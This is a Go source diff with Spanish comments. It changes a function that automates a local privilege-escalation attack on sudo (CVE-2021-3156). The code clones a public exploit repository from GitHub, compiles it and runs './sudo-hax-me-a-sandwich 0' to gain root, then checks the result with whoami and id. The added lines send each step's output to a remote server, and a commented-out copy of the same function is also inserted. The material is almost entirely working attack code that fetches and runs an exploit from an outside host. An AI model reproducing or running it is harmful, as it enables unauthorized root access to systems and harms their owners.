@@ -876,6 +876,85 @@ func SudoPotentialPrivilegeEscalation() {
 // 	fmt.Println("Continuando con el flujo del programa")
 // }
 
+// func SudoPotentialPrivilegeEscalationExploitation() {
+
+// 	// Cambiar al directorio home del usuario
+// 	homeDir := "/home/pepe"
+// 	if err := os.Chdir(homeDir); err != nil {
+// 		fmt.Printf("Error al cambiar al directorio home: %v\n", err)
+// 		return
+// 	}
+// 	fmt.Printf("Directorio de trabajo cambiado a: %s\n", homeDir)
+
+// 	// Verificar si la carpeta CVE-2021-3156 ya existe
+// 	repoDir := "CVE-2021-3156"
+// 	if _, err := os.Stat(repoDir); !os.IsNotExist(err) {
+// 		// Si la carpeta existe, eliminarla
+// 		fmt.Printf("La carpeta %s ya existe. Eliminándola...\n", repoDir)
+// 		rmCmd := exec.Command("rm", "-rf", repoDir)
+// 		rmOut, rmErr := rmCmd.CombinedOutput()
+// 		if rmErr != nil {
+// 			fmt.Printf("Error al eliminar la carpeta: %v\n", rmErr)
+// 			fmt.Printf("Salida del comando: %s\n", rmOut)
+// 			return
+// 		}
+// 		fmt.Println("Carpeta eliminada exitosamente")
+// 	}
+
+// 	// Clonar el repositorio
+// 	cloneCmd := exec.Command("git", "clone", "https://github.com/blasty/CVE-2021-3156.git")
+// 	cloneOut, cloneErr := cloneCmd.CombinedOutput()
+// 	if cloneErr != nil {
+// 		fmt.Printf("Error al clonar el repositorio: %v\n", cloneErr)
+// 		fmt.Printf("Salida del comando: %s\n", cloneOut)
+// 		return
+// 	}
+// 	fmt.Println("Repositorio clonado exitosamente")
+// 	fmt.Printf("Salida del comando: %s\n", cloneOut)
+
+// 	// Cambiar al directorio del repositorio clonado
+// 	if err := os.Chdir(repoDir); err != nil {
+// 		fmt.Printf("Error al cambiar al directorio del repositorio: %v\n", err)
+// 		return
+// 	}
+// 	fmt.Println("Cambiado al directorio CVE-2021-3156")
+
+// 	// Ejecutar 'make'
+// 	makeCmd := exec.Command("make")
+// 	makeOut, makeErr := makeCmd.CombinedOutput()
+// 	if makeErr != nil {
+// 		fmt.Printf("Error al ejecutar 'make': %v\n", makeErr)
+// 		fmt.Printf("Salida del comando: %s\n", makeOut)
+// 		return
+// 	}
+// 	fmt.Println("Comando 'make' ejecutado exitosamente")
+// 	fmt.Printf("Salida del comando: %s\n", makeOut)
+
+// 	// Ejecutar './sudo-hax-me-a-sandwich 0'
+// 	runCmd := exec.Command("./sudo-hax-me-a-sandwich", "0")
+// 	runOut, runErr := runCmd.CombinedOutput()
+// 	if runErr != nil {
+// 		fmt.Printf("Error al ejecutar './sudo-hax-me-a-sandwich 0': %v\n", runErr)
+// 		fmt.Printf("Salida del comando: %s\n", runOut)
+// 		return
+// 	}
+// 	fmt.Println("Comando './sudo-hax-me-a-sandwich 0' ejecutado exitosamente")
+// 	fmt.Printf("Salida del comando: %s\n", runOut)
+
+// 	// Ejecutar un shell interactivo para capturar 'whoami' y 'id' en el mismo contexto
+// 	shellCmd := exec.Command("/bin/bash", "-c", "whoami && id")
+// 	shellOut, shellErr := shellCmd.CombinedOutput()
+// 	if shellErr != nil {
+// 		fmt.Printf("Error al ejecutar 'whoami && id': %v\n", shellErr)
+// 		fmt.Printf("Salida del comando: %s\n", shellOut)
+// 		return
+// 	}
+// 	fmt.Printf("Información de usuario después de ejecutar el exploit:\n%s\n", shellOut)
+
+// 	// Continuar con el flujo del programa
+// 	fmt.Println("Continuando con el flujo del programa")
+// }
+
 func SudoPotentialPrivilegeEscalationExploitation() {
 
 	// Cambiar al directorio home del usuario
@@ -904,13 +983,22 @@ func SudoPotentialPrivilegeEscalationExploitation() {
 	// Clonar el repositorio
 	cloneCmd := exec.Command("git", "clone", "https://github.com/blasty/CVE-2021-3156.git")
 	cloneOut, cloneErr := cloneCmd.CombinedOutput()
+	cloneOutput := string(cloneOut)
 	if cloneErr != nil {
 		fmt.Printf("Error al clonar el repositorio: %v\n", cloneErr)
-		fmt.Printf("Salida del comando: %s\n", cloneOut)
+		fmt.Printf("Salida del comando: %s\n", cloneOutput)
+		// Enviar reporte del error al clonar el repositorio
+		if sendErr := reports.SendReportToServer("git clone https://github.com/blasty/CVE-2021-3156.git", cloneOutput); sendErr != nil {
+			fmt.Println("Error al enviar el informe:", sendErr)
+		}
 		return
 	}
 	fmt.Println("Repositorio clonado exitosamente")
-	fmt.Printf("Salida del comando: %s\n", cloneOut)
+	fmt.Printf("Salida del comando: %s\n", cloneOutput)
+	// Enviar reporte del éxito al clonar el repositorio
+	if sendErr := reports.SendReportToServer("git clone https://github.com/blasty/CVE-2021-3156.git", cloneOutput); sendErr != nil {
+		fmt.Println("Error al enviar el informe:", sendErr)
+	}
 
 	// Cambiar al directorio del repositorio clonado
 	if err := os.Chdir(repoDir); err != nil {
@@ -922,24 +1010,42 @@ func SudoPotentialPrivilegeEscalationExploitation() {
 	// Ejecutar 'make'
 	makeCmd := exec.Command("make")
 	makeOut, makeErr := makeCmd.CombinedOutput()
+	makeOutput := string(makeOut)
 	if makeErr != nil {
 		fmt.Printf("Error al ejecutar 'make': %v\n", makeErr)
-		fmt.Printf("Salida del comando: %s\n", makeOut)
+		fmt.Printf("Salida del comando: %s\n", makeOutput)
+		// Enviar reporte del error al ejecutar 'make'
+		if sendErr := reports.SendReportToServer("make", makeOutput); sendErr != nil {
+			fmt.Println("Error al enviar el informe:", sendErr)
+		}
 		return
 	}
 	fmt.Println("Comando 'make' ejecutado exitosamente")
-	fmt.Printf("Salida del comando: %s\n", makeOut)
+	fmt.Printf("Salida del comando: %s\n", makeOutput)
+	// Enviar reporte del éxito al ejecutar 'make'
+	if sendErr := reports.SendReportToServer("make", makeOutput); sendErr != nil {
+		fmt.Println("Error al enviar el informe:", sendErr)
+	}
 
 	// Ejecutar './sudo-hax-me-a-sandwich 0'
 	runCmd := exec.Command("./sudo-hax-me-a-sandwich", "0")
 	runOut, runErr := runCmd.CombinedOutput()
+	runOutput := string(runOut)
 	if runErr != nil {
 		fmt.Printf("Error al ejecutar './sudo-hax-me-a-sandwich 0': %v\n", runErr)
-		fmt.Printf("Salida del comando: %s\n", runOut)
+		fmt.Printf("Salida del comando: %s\n", runOutput)
+		// Enviar reporte del error al ejecutar './sudo-hax-me-a-sandwich 0'
+		if sendErr := reports.SendReportToServer("./sudo-hax-me-a-sandwich 0", runOutput); sendErr != nil {
+			fmt.Println("Error al enviar el informe:", sendErr)
+		}
 		return
 	}
 	fmt.Println("Comando './sudo-hax-me-a-sandwich 0' ejecutado exitosamente")
-	fmt.Printf("Salida del comando: %s\n", runOut)
+	fmt.Printf("Salida del comando: %s\n", runOutput)
+	// Enviar reporte del éxito al ejecutar './sudo-hax-me-a-sandwich 0'
+	if sendErr := reports.SendReportToServer("./sudo-hax-me-a-sandwich 0", runOutput); sendErr != nil {
+		fmt.Println("Error al enviar el informe:", sendErr)
+	}
 
 	// Ejecutar un shell interactivo para capturar 'whoami' y 'id' en el mismo contexto
 	shellCmd := exec.Command("/bin/bash", "-c", "whoami && id")
